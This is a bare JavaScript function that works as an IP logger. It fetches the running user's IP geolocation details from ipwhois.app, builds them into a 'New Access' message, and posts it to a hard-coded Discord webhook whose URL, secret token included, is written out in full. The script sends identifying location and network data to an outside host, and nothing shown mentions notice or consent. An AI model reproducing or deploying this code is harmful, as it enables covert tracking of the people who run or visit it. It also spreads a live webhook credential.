function req () {
  const get = {
    url:'https://ipwhois.app/json/',
    method:'GET'
  }
  axios(get).then(res => {
    var content = '```New Access: \n\n';
    function capitalize (str) {
      if(!str[0] || str.startsWith('https')) return str;
      else return str[0].toUpperCase()+str.slice(1,);
    }
    for (entry in res.data) {
      content+=capitalize(entry)+' : '+capitalize(res.data[entry])+'\n'
    }
    content+='```';
    const post = {
      url:'https://discord.com/api/webhooks/868691732454318091/z9xRVp174JQyy8XSFxMubeCLkcRkhDGpfvfiel0qDgx0jVQulispp0UGfddpVpK0GQF-',
      method:'POST',
      data:{
        "content":content,
      },
      headers:{
        'content-type':'application/json'
      }
    }
    axios(post);
  })
}
